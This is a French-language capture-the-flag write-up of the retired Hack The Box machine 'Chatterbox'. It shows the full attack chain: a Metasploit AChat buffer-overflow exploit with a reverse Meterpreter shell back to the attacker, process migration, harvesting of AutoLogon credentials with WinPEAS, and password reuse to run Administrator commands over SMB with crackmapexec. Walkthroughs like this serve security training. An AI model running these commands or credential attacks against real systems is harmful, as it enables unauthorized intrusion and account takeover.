| Room                                 | Chatterbox                              |
| ------------------------------------ | --------------------------------------- |
| Url                                  | https://app.hackthebox.com/machines/123 |
| Sujets                               | Windows                                 |
| Active/Retired lors de la résolution | Retired                                 |
| Difficulté                           | Medium                                  |

---
### Nmap

```bash
PORT      STATE SERVICE     REASON  VERSION
135/tcp   open  msrpc       syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn syn-ack Microsoft Windows netbios-ssn
445/tcp   open  ���d5V      syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  http        syn-ack AChat chat system httpd
|_http-favicon: Unknown favicon MD5: 0B6115FAE5429FEB9A494BEE6B18ABBE
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
9256/tcp  open  achat       syn-ack AChat chat system
49152/tcp open  msrpc       syn-ack Microsoft Windows RPC
49153/tcp open  msrpc       syn-ack Microsoft Windows RPC
49154/tcp open  msrpc       syn-ack Microsoft Windows RPC
49155/tcp open  msrpc       syn-ack Microsoft Windows RPC
49156/tcp open  msrpc       syn-ack Microsoft Windows RPC
49157/tcp open  msrpc       syn-ack Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 38735/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 60790/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 64306/udp): CLEAN (Timeout)
|   Check 4 (port 9559/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-09-07T19:49:09-04:00
| smb2-time: 
|   date: 2023-09-07T23:49:06
|_  start_date: 2023-09-07T23:45:56
|_clock-skew: mean: 6h20m01s, deviation: 2h18m36s, median: 4h59m59s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

---
### Exploit

On voit un service "AChat" (inconnu au bataillon): ça a l'air de répondre à du http, je tente d'aller dessus avec mon brave firefox mais... rien.

Un searchsploit sur AChat montre un buffer overflow possible sur une des versions. Pourquoi pas !
Un module metasploit semble exister, mais il n'est pas très coopératif à première vue:

```bash
[-] Exploit failed: windows/meterpreter/reverse_tcp: All encoders failed to encode.
[*] Exploit completed, but no session was created.
```

Une petite recherche me permet de voir que le souci n'apparait plus en changeant le type de payload:

```bash
set payload windows/meterpreter/reverse_tcp_allports
```

Et effectivement j'obtiens bien une connexion mais... elle meurt quelques secondes après. Tristesse.

```bash
msf6 exploit(windows/misc/achat_bof) > exploit

[*] Started reverse TCP handler on 10.10.16.13:1 
[*] Sending stage (175686 bytes) to 10.10.10.74
[*] Meterpreter session 2 opened (10.10.16.13:1 -> 10.10.10.74:49159) at 2023-09-07 21:04:15 +0200

meterpreter > shell
Process 2488 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
[*] 10.10.10.74 - Meterpreter session 2 closed.  Reason: Died
```

Je re-tente l'exploit, juste le temps de lancer une commande "ps":

```bash
meterpreter > ps

Process List
============

 PID   PPID  Name            Arch  Session  User               Path
 ---   ----  ----            ----  -------  ----               ----
 0     0     [System Proces
             s]
 4     0     System
 212   3860  CompatTelRunne
             r.exe
 232   4     smss.exe
 288   576   rundll32.exe    x86   1        CHATTERBOX\Alfred  C:\Windows\system32\rundll32.ex
                                                               e
 312   304   csrss.exe
 352   304   wininit.exe
 364   344   csrss.exe
 420   344   winlogon.exe
 456   352   services.exe
 464   352   lsass.exe
 472   352   lsm.exe
 576   456   svchost.exe
 592   920   wuauclt.exe     x86   1        CHATTERBOX\Alfred  C:\Windows\system32\wuauclt.exe
 640   456   vm3dservice.ex
             e
 664   456   svchost.exe
 716   456   svchost.exe
 792   456   svchost.exe
 872   456   svchost.exe
 920   456   svchost.exe
 968   456   svchost.exe
 984   456   svchost.exe
 1076  288   dinotify.exe    x86   1        CHATTERBOX\Alfred  C:\Windows\System32\dinotify.ex
                                                               e
 1104  456   svchost.exe
 1236  456   spoolsv.exe
 1272  456   svchost.exe
 1400  456   taskhost.exe    x86   1        CHATTERBOX\Alfred  C:\Windows\system32\taskhost.ex
                                                               e
 1424  456   svchost.exe
 1504  456   sppsvc.exe
 1548  792   dwm.exe         x86   1        CHATTERBOX\Alfred  C:\Windows\system32\Dwm.exe
 1572  1504  explorer.exe    x86   1        CHATTERBOX\Alfred  C:\Windows\Explorer.EXE
 1696  1572  vm3dservice.ex  x86   1        CHATTERBOX\Alfred  C:\Windows\System32\vm3dservice
             e                                                 .exe
 1704  1572  vmtoolsd.exe    x86   1        CHATTERBOX\Alfred  C:\Program Files\VMware\VMware
                                                               Tools\vmtoolsd.exe
 1824  456   VGAuthService.
             exe
 1852  456   vmtoolsd.exe
 1872  312   conhost.exe
 2100  456   dllhost.exe
 2160  576   WmiPrvSE.exe
 2344  456   msdtc.exe
 2540  456   SearchIndexer.
             exe
 2752  3052  AChat.exe       x86   1        CHATTERBOX\Alfred  c:\Program Files\AChat\AChat.ex
                                                               e
 3164  456   svchost.exe
 3188  920   taskeng.exe     x86   1        CHATTERBOX\Alfred  C:\Windows\system32\taskeng.exe
 3316  576   WmiPrvSE.exe
 3836  576   dllhost.exe     x86   1        CHATTERBOX\Alfred  C:\Windows\system32\DllHost.exe
 3860  456   CompatTelRunne
             r.exe
```

Impeccable. Je vois par exemple le PID 288, je tente donc de relancer l'exploit et de migrer très vite vers ce PID pour voir si mon shell se stabilise:

```bash
meterpreter > migrate 288
[*] Migrating from 3816 to 288...
[*] Migration completed successfully.
meterpreter > 
```

Ca fonctionne, mon shell semble être stable. 

```bash
C:\Windows\system32>whoami /all
whoami /all

USER INFORMATION
----------------

User Name         SID                                          
================= =============================================
chatterbox\alfred S-1-5-21-1218242403-4263168573-589647361-1000


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192  Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

Un déplacement sur le desktop de l'utilisateur: le flag est là, comme attendu.

---
### Devenons root

Et là... J'ai pas trop d'idées. Je fais un peu le tour du système, je ne vois pas grand chose. Un petit WinPEAS ? Aller.

Bingo.

```powershell
����������͹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  Alfred
    DefaultPassword               :  Welcome1!
```

Bon, c'est mon utilisateur actuel, certe, mais ça risque de me permettre de tenter quelques trucs sur le SMB qui semble ouvert.

```bash
┌──(pak㉿kali)-[~]
└─$ crackmapexec smb 10.10.10.74 -u Alfred -p 'Welcome1!'       
SMB         10.10.10.74     445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)
SMB         10.10.10.74     445    CHATTERBOX       [+] Chatterbox\Alfred:Welcome1! 
                                                                                                                                             
┌──(pak㉿kali)-[~]
└─$ crackmapexec smb 10.10.10.74 -u Administrator -p 'Welcome1!'
SMB         10.10.10.74     445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)
SMB         10.10.10.74     445    CHATTERBOX       [+] Chatterbox\Administrator:Welcome1! (Pwn3d!)
```

AH ! D'accord. Bah je n'y croyais pas forcément, mais il s'agit de password-reuse. Je suis root.

```bash
┌──(pak㉿kali)-[~]
└─$ crackmapexec smb 10.10.10.74 -u Administrator -p 'Welcome1!' -x 'dir C:\Users\Administrator\Desktop'
SMB         10.10.10.74     445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)
SMB         10.10.10.74     445    CHATTERBOX       [+] Chatterbox\Administrator:Welcome1! (Pwn3d!)
SMB         10.10.10.74     445    CHATTERBOX       [+] Executed command 
SMB         10.10.10.74     445    CHATTERBOX       Volume in drive C has no label.
SMB         10.10.10.74     445    CHATTERBOX       Volume Serial Number is 502F-F304
SMB         10.10.10.74     445    CHATTERBOX       
SMB         10.10.10.74     445    CHATTERBOX       Directory of C:\Users\Administrator\Desktop
SMB         10.10.10.74     445    CHATTERBOX       
SMB         10.10.10.74     445    CHATTERBOX       12/10/2017  07:50 PM    <DIR>          .
SMB         10.10.10.74     445    CHATTERBOX       12/10/2017  07:50 PM    <DIR>          ..
SMB         10.10.10.74     445    CHATTERBOX       09/07/2023  08:25 PM                34 root.txt
SMB         10.10.10.74     445    CHATTERBOX       1 File(s)             34 bytes
SMB         10.10.10.74     445    CHATTERBOX       2 Dir(s)   3,311,423,488 bytes free
                                                                                                                                             
┌──(pak㉿kali)-[~]
└─$ crackmapexec smb 10.10.10.74 -u Administrator -p 'Welcome1!' -x 'type C:\Users\Administrator\Desktop\root.txt'
SMB         10.10.10.74     445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)
SMB         10.10.10.74     445    CHATTERBOX       [+] Chatterbox\Administrator:Welcome1! (Pwn3d!)
SMB         10.10.10.74     445    CHATTERBOX       [+] Executed command 
SMB         10.10.10.74     445    CHATTERBOX       ce4b046919fe296c########8be1
```

:).